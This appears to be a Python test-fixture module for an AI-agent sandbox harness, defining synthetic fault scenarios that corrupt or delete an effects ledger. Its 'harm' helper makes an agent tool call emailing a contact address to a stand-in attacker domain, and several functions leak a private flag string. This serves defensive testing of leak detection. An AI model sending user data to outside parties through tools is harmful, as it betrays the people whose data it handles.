"""Synthetic collection faults inside the real jailed child; no provider clients."""

import json
import os
from pathlib import Path

import boto3
import botocore.session

from tests.sandbox_agents import clean

PRIVATE = "FLAG{team26-parent-collection-private}"


def forbid_provider(*args, **kwargs):
    raise AssertionError("provider construction forbidden in synthetic replay")


if os.getenv("MIRAGE_EFFECTS"):  # child only; parent guards are restored by the pytest fixture
    boto3.client = boto3.resource = forbid_provider
    botocore.session.Session.create_client = forbid_provider


def harm(snapshot, call_tool):
    call_tool("send_email", {"to": "attacker@evil-corp-demo.com",
                             "subject": "Synthetic leak", "body": "c1@contoso.example"})
    clean(snapshot, call_tool)


def _append(data):
    with Path(os.environ["MIRAGE_EFFECTS"]).open("ab") as ledger:
        ledger.write(data + b"\n")


def leaks_then_bad_json(snapshot, call_tool):
    harm(snapshot, call_tool)
    _append(b'{"private":"' + PRIVATE.encode())
    raise RuntimeError(PRIVATE)


def leaks_then_bad_shape(snapshot, call_tool):
    harm(snapshot, call_tool)
    _append(json.dumps([PRIVATE]).encode())


def leaks_then_bad_args(snapshot, call_tool):
    harm(snapshot, call_tool)
    _append(json.dumps({"step": 4, "tool": "send_email", "args": PRIVATE}).encode())


def leaks_then_bad_utf8(snapshot, call_tool):
    harm(snapshot, call_tool)
    _append(b"\xff" + PRIVATE.encode())
    raise RuntimeError(PRIVATE)


def leaks_then_bad_stderr(snapshot, call_tool):
    harm(snapshot, call_tool)
    os.write(2, b"\xff" + PRIVATE.encode())


def clean_then_bad_json(snapshot, call_tool):
    clean(snapshot, call_tool)
    _append(b'{"private":"' + PRIVATE.encode())


def missing_ledger(snapshot, call_tool):
    clean(snapshot, call_tool)
    Path(os.environ["MIRAGE_EFFECTS"]).unlink()


def directory_ledger(snapshot, call_tool):
    missing_ledger(snapshot, call_tool)
    Path(os.environ["MIRAGE_EFFECTS"]).mkdir()

